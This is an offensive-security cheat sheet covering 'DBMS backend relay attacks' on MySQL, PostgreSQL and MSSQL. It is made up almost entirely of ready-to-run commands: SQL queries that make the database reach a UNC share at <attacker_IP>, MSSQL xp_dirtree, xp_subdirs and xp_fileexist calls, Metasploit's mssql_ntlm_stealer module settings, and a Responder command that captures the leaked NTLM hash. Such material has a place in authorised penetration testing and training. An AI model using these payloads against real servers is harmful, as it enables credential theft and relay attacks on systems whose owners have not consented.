---
author(s):
  - Userware
tags:
  - initial-access
  - sniffing-and-spoofing
  - weaponization
  - client-side-attacks
  - scenarios
  - network-protocols
  - smb
---
# 02 - DBMS Backend Relay Attack

## 2.1 - MySQL

```
SELECT LOAD_FILE('\\\\<attacker_IP>\\snare\')
```

## 2.2 - PostgreSQL

```
CREATE TABLE test_table(test_column TEXT);
COPY test_table(test_column) FROM '\\\\<attacker_IP>\\snare\';
DROP TABLE test_table;
```

## 2.3 - MSSQL

### 2.3.1 - Manual

```
1> xp_dirtree '\\<attacker_IP>\snare\'
2> go

1> EXEC master.dbo.xp_dirtree '\\<attacker_IP>\snare\'
2> go

1> EXEC master.dbo.xp_subdirs '\\<attacker_IP>\snare\'
2> go

1> EXEC master.dbo.xp_fileexist '\\<attacker_IP>\snare\'
2> go
```

### 2.3.2 - Metasploit

```
msf > use auxiliary/admin/mssql/mssql_ntlm_stealer

msf auxiliary(admin/mssql/mssql_ntlm_stealer) > set rhosts <target_IP>

msf auxiliary(admin/mssql/mssql_ntlm_stealer) > set username <username>

msf auxiliary(admin/mssql/mssql_ntlm_stealer) > set password <password>
```

If we use Windows credential, set as below:

```
msf auxiliary(admin/mssql/mssql_ntlm_stealer) > set use_windows_authent true

msf auxiliary(admin/mssql/mssql_ntlm_stealer) > set smbproxy <responder_ip>

msf auxiliary(admin/mssql/mssql_ntlm_stealer) > run
```

Capture hash

```
$ sudo responder -I <interface>
```

---
## References

### OWASP

- [OWASP: Pwning a Shell via MSSQL DBMS](https://owasp.org/www-chapter-ghana/assets/slides/Pwning_a_shell_via_MSSQL_DBMS.pdf)

### Hacktricks

- [Hacktricks: Pentesting MSSQL Microsoft SQL Server](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-mssql-microsoft-sql-server/index.html)

### Osanda

- [Osanda: MySQL Out-of-Band Hacking](https://osandamalith.com/2017/02/03/mysql-out-of-band-hacking/)